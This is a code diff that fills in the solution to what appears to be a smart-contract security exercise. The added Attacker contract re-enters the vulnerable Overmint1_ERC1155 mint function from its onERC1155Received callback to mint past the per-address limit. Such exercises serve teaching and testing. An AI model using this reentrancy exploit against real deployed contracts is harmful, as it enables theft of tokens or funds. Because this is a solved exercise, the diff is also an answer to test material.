@@ -27,6 +27,43 @@ contract Overmint1_ERC1155 is ERC1155 {
 }
 
 /** CODE YOUR SOLUTION HERE */
-contract Attacker {
-    
+contract Attacker is ERC1155Holder  {
+    Overmint1_ERC1155 public target;
+    address public owner;
+    uint256 public targetId;
+
+
+
+    constructor(address _target) {
+        target = Overmint1_ERC1155(_target);
+        owner = msg.sender;
+    }
+
+    function attack(uint256 id) external {
+        targetId = id;
+        target.mint(id, "");
+    }
+
+    function onERC1155Received(
+        address, 
+        address, 
+        uint256 id, 
+        uint256, 
+        bytes memory
+        ) public override returns(bytes4) {
+            if (target.amountMinted(address(this), id) < 3) {
+                target.mint(id, ""); // Reentrant mint
+            }
+            return this.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address, 
+        address, 
+        uint256[] memory, 
+        uint256[] memory, 
+        bytes memory
+        ) public pure override returns (bytes4){
+            return IERC1155Receiver.onERC1155BatchReceived.selector;
+    }
 }
